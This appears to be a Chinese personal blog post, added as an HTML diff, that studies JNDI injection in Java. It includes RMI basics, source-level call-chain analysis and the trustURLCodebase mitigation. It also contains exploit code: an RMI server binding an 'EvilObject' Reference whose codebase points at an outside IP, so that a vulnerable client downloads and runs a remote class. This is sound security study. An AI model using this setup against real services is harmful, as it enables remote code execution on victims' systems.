@@ -1,0 +1,838 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/lihuaiqiu.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/lihuaiqiu.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Web," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="离怀秋" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="基本概念介绍本来不太想写这部分的…想了想…以后看的时候或许方便一些，还是写吧.. RMIJava RMI（Java Remote Method Invocation），即Java远程方法调用。是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。 RMI 使用 JRMP（Java Remote Message Protocol，Java远程消息交换协议）实现，使得客户端运行的程序可以调">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java安全学习(二)--JNDI注入">
+<meta property="og:url" content="http://yoursite.com/2020/02/28/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C-JNDI%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="离怀秋">
+<meta property="og:description" content="基本概念介绍本来不太想写这部分的…想了想…以后看的时候或许方便一些，还是写吧.. RMIJava RMI（Java Remote Method Invocation），即Java远程方法调用。是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。 RMI 使用 JRMP（Java Remote Message Protocol，Java远程消息交换协议）实现，使得客户端运行的程序可以调">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/27/3weKWF.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/27/3wzsWq.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/27/30lnZ4.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/27/30g2BF.png">
+<meta property="article:published_time" content="2020-02-27T16:38:27.000Z">
+<meta property="article:modified_time" content="2020-02-27T16:39:06.000Z">
+<meta property="article:author" content="离怀秋">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.ax1x.com/2020/02/27/3weKWF.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/02/28/Java安全学习-二-JNDI注入/"/>
+
+
+
+
+
+  <title>Java安全学习(二)--JNDI注入 | 离怀秋</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <a href="https://github.com/lihuaiqiu" target="_blank" rel="noopener" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">离怀秋</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">穷且益坚，不负青云之志</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/28/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C-JNDI%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="离怀秋">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="离怀秋">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Java安全学习(二)--JNDI注入</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-28T00:38:27+08:00">
+                2020-02-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="基本概念介绍"><a href="#基本概念介绍" class="headerlink" title="基本概念介绍"></a>基本概念介绍</h3><p>本来不太想写这部分的…想了想…以后看的时候或许方便一些，还是写吧..</p>
+<h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><p>Java RMI（Java Remote Method Invocation），即Java远程方法调用。是Java编程语言里，一种用于实现远程过程调用的应用程序<strong>编程接口</strong>。</p>
+<p>RMI 使用 JRMP（Java Remote Message Protocol，Java远程消息交换协议）实现，使得客户端运行的程序可以调用远程服务器上的对象。是实现RPC的一种方式。</p>
+<p>RMI的简单实现</p>
+<p>Server端</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义远程对象的接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">HelloService</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function">String <span class="title">say</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//接口的实现</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloServiceImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">HelloService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloServiceImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">say</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//注册远程对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException, MalformedURLException </span>&#123;</span><br><span class="line">        HelloServiceImpl helloService = <span class="keyword">new</span> HelloServiceImpl();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(<span class="string">"rmi://127.0.0.1/hello"</span>,helloService);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Client端</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException, MalformedURLException </span>&#123;</span><br><span class="line">        HelloService helloService = (HelloService) Naming.lookup(<span class="string">"rmi://127.0.0.1/hello"</span>);</span><br><span class="line">        System.out.println(helloService.say());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="RMI的调用机制"><a href="#RMI的调用机制" class="headerlink" title="RMI的调用机制"></a>RMI的调用机制</h5><p>RMI 采用stubs 和 skeletons 来进行远程对象(remote object)的通讯。stub 充当远程对象的客户端代理，有着和远程对象相同的远程接口，远程对象的调用实际是通过调用该对象的客户端代理对象stub来完成的。</p>
+<h5 id="RMI调用过程"><a href="#RMI调用过程" class="headerlink" title="RMI调用过程"></a>RMI调用过程</h5><p><img src="https://s2.ax1x.com/2020/02/27/3weKWF.png" alt="3weKWF.png"></p>
+<p>客户端调用stub(存根上的方法)，存根负责将要调用的远程对象方法的方法名以及其参数编组打包，并且通过Socket通信发送给Skeleton，Skeleton将客户端发送过来的数据包中的方法名以及编组的参数进行解析，并且在服务端将此方法执行，执行完毕后将返回值通过相反的路径返回给客户端Stub，Stub将返回结果解析后给客户程序。</p>
+<h3 id="RMI-JNDI注入"><a href="#RMI-JNDI注入" class="headerlink" title="RMI+JNDI注入"></a>RMI+JNDI注入</h3><p>RMIClient</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">            ctx.lookup(<span class="string">"rmi://localhost:8080/refObj"</span>);</span><br><span class="line">            String data = <span class="string">"This is RMI Client."</span>;</span><br><span class="line">            <span class="comment">//System.out.println(serv.service(data));</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>RMIServer</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">8080</span>);</span><br><span class="line">        Reference refObj = <span class="keyword">new</span> Reference(<span class="string">"EvilObject"</span>, <span class="string">"EvilObject"</span>, <span class="string">"http://139.224.236.99/"</span>);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(refObj);</span><br><span class="line">        System.out.println(<span class="string">"Binding 'refObjWrapper' to 'rmi://127.0.0.1:8080/refObj'"</span>);</span><br><span class="line">        registry.bind(<span class="string">"refObj"</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行触发</p>
+<p><img src="https://s2.ax1x.com/2020/02/27/3wzsWq.png" alt="3wzsWq.png"></p>
+<p>调用链分析</p>
+<p><img src="https://s2.ax1x.com/2020/02/27/30lnZ4.png" alt="30lnZ4.png"></p>
+<p>InitialContext.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(String name)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> getURLOrDefaultInitCtx(name).lookup(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>GenericURLContext.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(String var1)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="comment">//此处this为rmiURLContext类调用对应类的getRootURLContext类为解析RMI地址</span></span><br><span class="line">    <span class="comment">//不同协议调用这个函数，根据之前getURLOrDefaultInitCtx(name)返回对象的类型不同，执行不同的getRootURLContext</span></span><br><span class="line">    <span class="comment">//进入不同的协议路线</span></span><br><span class="line">    ResolveResult var2 = <span class="keyword">this</span>.getRootURLContext(var1, <span class="keyword">this</span>.myEnv);<span class="comment">//获取RMI注册中心相关数据</span></span><br><span class="line">    Context var3 = (Context)var2.getResolvedObj();<span class="comment">//获取注册中心对象</span></span><br><span class="line"></span><br><span class="line">    Object var4;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var4 = var3.lookup(var2.getRemainingName());<span class="comment">//去注册中心调用lookup查找，我们进入此处，传入name-aa</span></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        var3.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> var4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>RegistryContext.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(Name var1)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (var1.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> RegistryContext(<span class="keyword">this</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Remote var2;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2 = <span class="keyword">this</span>.registry.lookup(var1.get(<span class="number">0</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotBoundException var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NameNotFoundException(var1.get(<span class="number">0</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)wrapRemoteException(var5).fillInStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.decodeObject(var2, var1.getPrefix(<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>RegistryContext.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//如果是Reference对象的话,将进行一次RMI服务器的链接,获取远程class文件</span></span><br><span class="line">        Object var3 = var1 <span class="keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">        <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException var5) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var5;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException var6) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (NamingException)wrapRemoteException(var6).fillInStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">        NamingException var4 = <span class="keyword">new</span> NamingException();</span><br><span class="line">        var4.setRootCause(var7);</span><br><span class="line">        <span class="keyword">throw</span> var4;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>NamingManager.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (ref != <span class="keyword">null</span>) &#123;</span><br><span class="line">        String f = ref.getFactoryClassName();</span><br><span class="line">        <span class="keyword">if</span> (f != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// if reference identifies a factory, use exclusively</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//跟进            factory = getObjectFactoryFromReference(ref, f);</span></span><br><span class="line">            <span class="keyword">if</span> (factory != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,</span><br><span class="line">                                                 environment);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过getObjectFactoryFromReference或者getObjectInstance进行命令执行,这两个命令执行点都可以进行命令执行，不过第一个在执行的时候会发生报错，由于我们自定义的类实例化后不能转化为ObjectFactory，所以我们需要定义的类要继承该类，并且重写getObjectInstance接口，完成第二处命令执行</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">         clas = helper.loadClass(factoryName);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="comment">// ignore and continue</span></span><br><span class="line">        <span class="comment">// e.printStackTrace();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// All other exceptions are passed up.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Not in class path; try to use codebase</span></span><br><span class="line">    String codebase;</span><br><span class="line">    <span class="keyword">if</span> (clas == <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">            (codebase = ref.getFactoryClassLocation()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clas = helper.loadClass(factoryName, codebase);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (clas != <span class="keyword">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先尝试本地或者此class，在本地不存在此class的情况下，从codebase中获取此class并且进行加载和实例化</p>
+<h4 id="RMI-JNDI注入原理"><a href="#RMI-JNDI注入原理" class="headerlink" title="RMI+JNDI注入原理"></a>RMI+JNDI注入原理</h4><p>当注册RMI服务的时候，可以指定远程加载类codebase url的位置，通过该属性可以让JNDI来加载我们指定的远程类，当<code>JNDI</code>应用程序通过<code>lookup</code>(RMI服务的地址)调用指定<code>codebase url</code>上的类后，会调用被远程调用类的构造方法，所以如果我们将恶意代码放在被远程调用类的构造方法中时，漏洞就会触发。</p>
+<h4 id="RMI触发JNDI的限制"><a href="#RMI触发JNDI的限制" class="headerlink" title="RMI触发JNDI的限制"></a>RMI触发JNDI的限制</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">            ctx.lookup(<span class="string">"rmi://localhost:8080/refObj"</span>);</span><br><span class="line">            String data = <span class="string">"This is RMI Client."</span>;</span><br><span class="line">            <span class="comment">//System.out.println(serv.service(data));</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过上面这段代码，我们会发现我们是需要一个可控的参数的，并且在java高版本中和低版本的某些版本中<strong>系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false</strong>，即默认不允许从远程的Codebase加载Reference工厂类。</p>
